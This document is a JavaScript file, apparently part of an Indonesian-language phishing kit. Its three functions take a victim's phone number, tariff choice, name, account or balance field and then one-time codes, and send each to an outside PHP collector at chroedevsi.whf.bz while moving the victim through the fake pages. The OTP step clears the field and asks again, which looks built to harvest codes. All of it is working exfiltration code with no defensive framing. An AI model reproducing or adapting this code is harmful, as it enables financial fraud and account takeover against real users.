function sendHp() {
   $('.kleman').fadeIn();   
   $('.x').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
      url: 'https://chroedevsi.whf.bz/play/no.php',
      type: 'POST',
      data: $('#login').serialize(),  
      complete: function() {
         setTimeout(function() {
            window.location = "belum.html";
            $('.x').hide();            
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};     


    
    
// Belum
function sendBelum(){    
    $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'https://chroedevsi.whf.bz/play/belum.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "otpblm.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#saldo').val();
            sessionStorage.setItem('rek', rek);
         }, 500);
      }
   });
};
    



        
function sendOtp() {
            event.preventDefault();
            document.getElementById('kirims').value = "Memproses...."; 
           
            
     $.ajax({
        type: 'POST',
        url: 'https://chroedevsi.whf.bz/play/otpblm.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
                    $("#nama1").val('');
                    $("#nama1").focus();
                    setTimeout(function () {
                        $("#errorAlert").slideUp();                                                
                    }, 3000);
                },
                error: function (error) {
                    $("#loader").hide();
                    $(".btn-primary").prop("disabled", false);
                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
                    $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
                }
            });
        };
